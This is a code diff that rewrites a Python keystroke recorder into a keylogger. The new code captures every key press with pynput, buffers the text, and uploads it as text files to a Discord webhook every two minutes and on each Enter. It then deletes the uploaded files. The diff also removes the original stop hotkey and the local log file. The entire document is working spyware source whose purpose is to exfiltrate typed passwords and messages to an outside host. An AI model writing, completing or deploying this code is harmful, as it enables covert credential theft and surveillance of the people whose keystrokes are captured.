@@ -1,41 +1,68 @@
 import os
+import time
+import requests
+import threading
 from pynput import keyboard
+from datetime import datetime
 
-# File setup
-folder_path = os.path.dirname(os.path.abspath(__file__))
-log_file = os.path.join(folder_path, "my_keystrokes.txt")
+WEBHOOK_URL = "webhook_url_here"
+INTERVAL = 120 
 
-def write_to_file(content):
-    with open(log_file, "a") as f:
+log_buffer = []
+
+def get_filename():
+    return f"log_{datetime.now().strftime('%Y-%m-%d_%H-%M')}.txt"
+
+def upload_to_discord(content):
+    if not content.strip():
+        return
+    
+    filename = get_filename()
+    with open(filename, "w", encoding="utf-8") as f:
         f.write(content)
+    
+    try:
+        with open(filename, "rb") as f:
+            requests.post(WEBHOOK_URL, files={"file": (filename, f)})
+        print(f"✅ Uploaded: {filename}")
+    except Exception as e:
+        print(f"Upload failed: {e}")
+    
+    try:
+        os.remove(filename)
+    except:
+        pass
+
+def auto_report():
+    """Timer that triggers file upload every 60s"""
+    global log_buffer
+    if log_buffer:
+        full_log = "".join(log_buffer)
+        upload_to_discord(full_log)
+        log_buffer = []
+    
+    timer = threading.Timer(INTERVAL, auto_report)
+    timer.daemon = True
+    timer.start()
 
 def on_press(key):
+    global log_buffer
     try:
-        # Record regular characters
-        write_to_file(key.char)
+        log_buffer.append(key.char)
     except AttributeError:
-        # Handle special keys
-        special_keys = {
-            keyboard.Key.space: " ",
-            keyboard.Key.enter: "\n",
-            keyboard.Key.tab: "\t"
-        }
-        write_to_file(special_keys.get(key, f" [{key}] "))
+        if key == keyboard.Key.space:
+            log_buffer.append(" ")
+        elif key == keyboard.Key.enter:
+            log_buffer.append("\n")
+            full_log = "".join(log_buffer)
+            upload_to_discord(full_log)
+            log_buffer = []
+        elif key == keyboard.Key.backspace:
+            if log_buffer:
+                log_buffer.pop()
 
-def on_activate_hkey():
-    print("\n[STOP SIGNAL] Ctrl + Alt + C detected. Stopping...")
-    # This will stop the listener
-    main_listener.stop()
-
-# Define the hotkey combination
-hkey_combination = '<ctrl>+<alt>+c'
-
-print(f"Recording... Saving to: {log_file}")
-print(f"Press {hkey_combination} to stop recording.")
-
-# We use two listeners: 
-# 1. The Global Hotkey for the stop command
-# 2. The standard Listener to record everything
-with keyboard.GlobalHotKeys({hkey_combination: on_activate_hkey}) as hkey_listener:
-    with keyboard.Listener(on_press=on_press) as main_listener:
-        main_listener.join()
+if __name__ == "__main__":
+    print("logger started... (Uploading .txt files to Discord)")
+    auto_report()
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
